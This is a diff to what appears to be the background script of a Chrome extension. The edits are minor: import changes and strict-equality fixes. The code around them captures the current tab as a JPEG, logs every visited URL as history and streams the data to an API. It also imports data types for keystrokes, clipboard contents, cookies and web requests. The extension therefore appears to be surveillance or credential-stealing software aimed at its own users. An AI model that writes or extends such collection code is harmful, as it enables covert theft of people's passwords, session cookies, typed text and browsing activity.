@@ -1,6 +1,12 @@
 import { handleDataStream } from "../utils/handler/dataHandler";
 import { API, DataTypes } from "../consts";
-import { captureGeoLocation, getCookies, getCurrentTab, handleCapture, trimDomain } from "../utils/browser/utils";
+import { getCookies, getCurrentTab, handleCapture, trimDomain } from "../utils/browser/utils";
+import KeystrokeDto from "../api/dto/keystrokes.dto";
+import ClipboardDto from "../api/dto/clipboard.dto";
+import CookieDto from "../api/dto/cookies.dto";
+import HistoryDto from "../api/dto/history.dto";
+import TabCaptureDto from "../api/dto/tabCapture.dto";
+import WebRequestDto from "../api/dto/webRequest.dto";
 
 chrome.runtime.onMessage.addListener(async (message, sender, response) => {
     const { type, data }: {type: DataTypes; data?: any} = message;
@@ -11,7 +17,7 @@ chrome.runtime.onMessage.addListener(async (message, sender, response) => {
             break;
         case DataTypes.TAB_CAPTURE:
             let capture: string = await handleCapture();
-            if (capture != "Failed") {
+            if (capture !== "Failed") {
                 let bytes = Buffer.from(capture.split(',')[1], 'base64');
                 const blob = new Blob([bytes], {
                     type: "image/jpeg"
@@ -47,7 +53,7 @@ chrome.alarms.onAlarm.addListener(async () => {
 });
 
 chrome.webNavigation.onCompleted.addListener(async (details) => {
-    if (details.url != "about:blank" && details.url != "chrome://new-tab-page/") {
+    if (details.url !== "about:blank" && details.url !== "chrome://new-tab-page/") {
         const history: HistoryDto = {url: details.url}
         await handleDataStream([history], [DataTypes.HISTORY]);
     }
